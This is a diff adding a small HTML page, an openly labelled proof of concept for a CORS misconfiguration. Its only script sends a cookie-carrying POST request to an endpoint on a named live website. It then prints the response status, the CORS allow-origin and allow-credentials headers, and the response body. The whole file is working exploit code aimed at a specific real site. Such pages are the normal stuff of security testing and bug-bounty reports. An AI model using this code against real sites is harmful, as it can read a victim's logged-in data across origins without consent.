@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Misconfiguration PoC</h2>
+
+<button onclick="exploit()">Run PoC</button>
+<pre id="output"></pre>
+
+<script>
+function exploit() {
+    fetch("https://analisacademy.com/cdn-cgi/rum?", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ "poc": "test" })
+    })
+    .then(async r => {
+        document.getElementById("output").textContent =
+            "Status: " + r.status + "\n" +
+            "Allow-Origin: " + r.headers.get("Access-Control-Allow-Origin") + "\n" +
+            "Allow-Credentials: " + r.headers.get("Access-Control-Allow-Credentials") + "\n" +
+            "Response: " + await r.text();
+    })
+    .catch(e => {
+        document.getElementById("output").textContent = "Browser Blocked: " + e;
+    });
+}
+</script>
+
+</body>
+</html>
